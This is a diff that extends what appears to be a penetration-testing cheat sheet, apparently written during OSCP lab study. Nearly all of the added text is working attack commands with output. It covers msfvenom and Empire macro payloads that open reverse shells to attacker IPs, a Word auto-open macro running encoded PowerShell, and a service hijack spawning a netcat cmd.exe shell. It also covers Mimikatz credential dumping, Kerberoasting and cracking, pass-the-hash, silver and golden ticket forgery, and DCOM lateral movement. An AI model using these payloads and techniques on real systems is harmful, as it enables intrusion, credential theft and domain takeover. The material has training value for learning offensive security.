@@ -4,7 +4,7 @@
 
 ### Bind shell
 
-Basically, we are opening a port with our shell for other people to connect
+Basically, we are opening a port with our shell for other people to execute
 - Client computer starts up a listening session with shell executing on that port
 - Connector just connects to the listening port that has shell already running
 
@@ -129,7 +129,7 @@ sudo python -m SimpleHTTPServer 80
 ```
 
 
-## Transferring files
+## FIle transfer
 
 ### Linux to Windows:
 
@@ -151,6 +151,18 @@ One line form:
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
 ```
 
+### Windows to linux
+
+Create a python server and get it from the linux machine:
+
+On windows:
+```cmd
+python -m SimpleHTTPServer 80
+```
+On linux:
+```sh
+wget http://<windows-machine-ip>/<file-name>
+```
 #### Netcat
 
 In command prompt:
@@ -222,6 +234,87 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 Get-ExecutionPolicy -Scope CurrentUser
 ```
 
+## Microsoft-word macro payload
+
+First create an `evil.hta` file like so:
+
+```sh
+# recommended
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.194 LPORT=80 -f vba-psh > payload.txt
+# or
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta 
+```
+
+Next create a new macro and copy-paste the file into the macro
+
+Finally create a word macro and past the shell code in like so:
+
+```vbscript
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
+    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
+    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
+    ...
+    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
+    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
+    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
+    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"   
+    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+    Str = Str + "QA=" 
+    
+    CreateObject("Wscript.Shell").Run Str 
+End Sub
+```
+
+Now save the file as either a `docm` file type or a `doc` (older) file type 
+
+**ALTERNATIVELY**
+
+we can use powershell empire
+
+```sh
+(Empire) > listeners
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > set Host 192.168.119.194
+(Empire: listeners/http) > set Name exploit
+(Empire: listeners/http) > execute
+[*] Starting listener 'exploit'
+ * Serving Flask app "http" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+[+] Listener successfully started!
+(Empire: listeners/http) > back
+(Empire: listeners) > usestager windows/macro
+(Empire: stager/windows/macro) > listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  exploit           http            http://192.168.119.194:80            5/0.0                  
+
+(Empire: stager/windows/macro) > set Listener exploit
+(Empire: stager/windows/macro) > execute
+
+[*] Stager output written out to: /tmp/macro
+```
+
+Check if macro was embedded using `olevba word_macro.doc from [oletools](https://github.com/decalage2/oletools)
+
 ## Metasploit framework
 
 ### Windows reverse meterpreter shell
@@ -279,7 +372,7 @@ sudo msfconsole
     - Find out more about module: `/sbin/modinfo <module_name>`
 - Find any binaries that can be run as root: `find / -perm -u=s -type f 2>/dev/null`
 
-## Privilege escalation
+## Privilege escalation (Priv esc)
 
 ### Windows
 
@@ -364,6 +457,16 @@ then we can just replace that exe with our own malicious exe and rerun the servi
 
 `net stop [service name] && net start [service name].`
 
+###### Example
+
+```sh
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.119.194 443 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+sc qc upnphost
+net start upnphost
+```
+
 ##### Microsoft systems internal suite
 
 This system's internal suite: [Link](https://download.sysinternals.com/files/SysinternalsSuite.zip) contains a variety of scripts that can be used to check user privileges.
@@ -406,10 +509,286 @@ ss -antp | grep "<out_port_number>"
 [System.DirecrotyServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
+### Get all Service Principal Names (SPN's)
+
+```ps
+cls
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.filter = "(servicePrincipalName=*)"
+
+## You can use this to filter for OU's:
+## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' }
+$results = $search.Findall()
+
+foreach( $result in $results ) {
+	$userEntry = $result.GetDirectoryEntry()
+	Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
+	Write-host "DN      =      "  $userEntry.distinguishedName
+	Write-host "Object Cat. = "  $userEntry.objectCategory
+	Write-host "servicePrincipalNames"
+
+	$i=1
+	foreach( $SPN in $userEntry.servicePrincipalName ) {
+		Write-host "SPN(" $i ")   =      " $SPN
+		$i+=1
+	}
+	Write-host ""
+}
+```
 ## Password cracking
 
 ### Hash identifier
 
 ```sh
 hash-identifier AAFDC23870ECBCD3D557B6423A8982134E17927E
+```
+
+### Mimikatz
+
+#### Password Hashes
+
+To get password hashes on windows, we can use [mimikatz](https://github.com/gentilkiwi/mimikatz)
+
+Then in mimikats:
+
+```sh
+c:\Tools\active_directory>mimikatz.exe
+
+  .#####.   mimikatz 2.1.1 (x86) built on Mar 25 2018 21:00:57
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+```
+
+or
+
+```sh
+sekurlsa::minidump C:\Users\%USERNAME%\Documents\lsass.DMP
+```
+
+#### Tickets [Ticket Granting Ticket / Ticket Granting Service]
+
+TGT can request for TGS for resources wanted in domain
+
+```sh
+sekurlsa::tickets
+```
+
+### Display kerberos service ticket
+
+```ps
+PS C:\Windows\system32> Add-Type -AssemblyName System.IdentityModel
+PS C:\Windows\system32> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWe
+bServer.corp.com'
+
+Id                   : uuid-393f01fe-efad-46c9-a875-8ddc9eb96828-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 5/29/2020 8:30:02 PM
+ValidTo              : 5/30/2020 6:26:32 AM
+ServicePrincipalName : HTTP/CorpWebServer.corp.com
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+# can alternatively use klist command 
+PS C:\Windows\system32> klist
+
+# or inside mimikatz to export into files to be downloaded to attack machine:
+mimikatz # kerberos::list /export
+
+# Or use Invoke-kerberoast
+Import-Module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
+```
+
+Now to crack service tickets to find clear-text passwords for service accounts
+
+```sh
+~/kerberoast(master*) » python3 tgsrepcrack.py rockyou-20.txt ~/OSCP-excercises/1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi                              omar2535@kali
+
+
+USE HASHCAT, IT'S HELLA FASTER!!
+
+
+Cracking 1 tickets...
+found password for ticket 0: Qwerty09!  File: /home/omar2535/OSCP-excercises/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+Successfully cracked all tickets
+```
+
+### Pass the Hash
+
+Once the NTLM hash is retrieved, we can construct a pass the hash attack to elevate our priveleges using NTLM authentication.
+For example, if our NTLM hash was `2892d26cdf84d7a70e2eb3b9f05c425e`, then our command to pass the hash would be 
+```sh
+# the following command will launch a rdesktop with that user's hash
+# the aad3b435b51404eeaad3b435b51404ee part after the userid means "no password"
+pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.194.10 cmd 
+
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.16299.15]
+(c) 2017 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>
+```
+
+### Overpass the hash
+
+We can bypass NTLM authentication and get a TGT by passing the hash within mimikats like so:
+
+```sh
+mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
+```
+
+and a powershell is spawned. To check our kerberos tickets:
+
+```ps
+> klist
+```
+
+Now we can log into the domain controller using psexec like so:
+
+```ps
+PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
+```
+
+### Creating a silver ticket to authenticate with
+
+First find the SID:
+
+```ps
+PS C:\Tools\active_directory> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name   SID
+=========== ==============================================
+corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
+PS C:\Tools\active_directory> .\mimikatz.exe
+```
+
+Now purge all existing tickets
+```ps
+mimikatz # kerberos::purge
+mimikatz # kerberos::list
+```
+
+Now create the new ticket with the sid's last portion cut off and the rc4 from the NTLM hash
+
+```ps
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
+```
+
+### Distributed Component Object model (Pivoting)
+
+We can launch applications on another computer from a workstation with microsoft office installed.
+
+First let's view the available methods and find if the `run` method is available.
+
+Ip addresss of remote workstation: 172.16.194.5
+
+```ps
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.194.5"))
+$com | Get-Member
+```
+
+Now create the excel macro 
+
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.194.10 LPORT=5555 -f vba-psh > new_payload.txt
+cat new_payload.txt
+```
+copy it to the remote computer
+```ps
+$LocalPath = "C:\Users\jeff_admin\Documents\myexcel.xls"
+$RemotePath = "\\172.16.194.5\c$\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+```
+
+Now open the excel file from our machine by creating a system profile on the remote machine then running it
+
+```ps
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.194.5"))
+
+$Path = "\\172.16.194.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
+$com.Run("Workbook_Open")
+$com.Run("mOaoZH8")
+$com.Run("AutoOpen")
+```
+
+### Creating a golden ticket to psexec on domain controller
+
+Go into the domain controller and grab the NTLM hash
+
+```ps
+# On the domain controller:
+C:\Tools>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : fc274a94b36874d2560a7bd332604fab
+```
+
+Now on the workstation:
+
+Find the SID first using `whoami /user` without the last part after the `-`.
+```ps
+C:\Tools>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
+```
+
+Now we can launch a command prompt on the domain controller using `psexec` like so:
+
+```cmd
+C:\Windows\system32>cd C:\Tools\active_directory
+
+C:\Tools\active_directory>PsExec.exe \\dc01 cmd.exe
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+corp\fakeuser
 ```
